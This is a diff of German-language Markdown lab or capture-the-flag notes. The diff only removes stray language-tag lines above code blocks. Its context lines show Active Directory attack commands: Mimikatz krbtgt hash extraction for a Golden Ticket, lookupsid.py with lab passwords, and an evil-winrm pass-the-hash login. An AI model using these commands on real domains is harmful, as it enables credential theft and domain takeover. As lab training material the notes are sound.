@@ -126,7 +126,6 @@ lookupsid.py lab.trusted.vl/harry:'haxxor@12345'@10.10.255.70
 
 ### Golden Ticket auf Domain Controller (Mimikatz)
 
-cmd
 
 ```cmd
 # 1. Mimikatz starten
@@ -138,7 +137,6 @@ privilege::debug
 
 **Erwartete Ausgabe:** `Privilege '20' OK`
 
-mimikatz
 
 ```mimikatz
 # 3. Kerberos Informationen extrahieren
@@ -150,7 +148,6 @@ lsadump::lsa /inject /name:krbtgt
 - Domain SID
 - krbtgt NTLM Hash
 
-mimikatz
 
 ```mimikatz
 # 4. Golden Ticket erstellen
@@ -180,7 +177,6 @@ misc::cmd
 
 ### Trust Relationship Discovery
 
-powershell
 
 ```powershell
 # Trust-Beziehungen analysieren (PowerShell auf DC)
@@ -514,7 +510,6 @@ whoami   # Should show MARVEL\Administrator
 
 ### Domain Admin Commands
 
-cmd
 
 ```cmd
 # Domain User erstellen
@@ -591,7 +586,6 @@ firefox lootme/domain_computers.html
 
 ### PowerShell Flag Search
 
-powershell
 
 ```powershell
 # In Evil-WinRM oder PSExec Session auf DC
@@ -606,7 +600,6 @@ Get-ChildItem -Path C:\ -Include "user.txt", "*flag*", "root.txt" -File -Recurse
 evil-winrm -i 10.10.255.70 -u cpowers -H 322db798a55f85f09b3d61b976a13c43
 ```
 
-powershell
 
 ```powershell
 # Flag lesen
@@ -616,7 +609,6 @@ type C:\Users\ewalters\Desktop\User.txt
 
 ### Parent Domain Flag (EFS Problem)
 
-cmd
 
 ```cmd
 # Ownership übernehmen
@@ -663,7 +655,6 @@ lookupsid.py marvel.local/hawkeye:'Password1@'@192.168.xx.x
 
 ### Phase 3: Golden Ticket Creation
 
-bash
 
 ```bash
 # 1. Auf Windows System mit Mimikatz
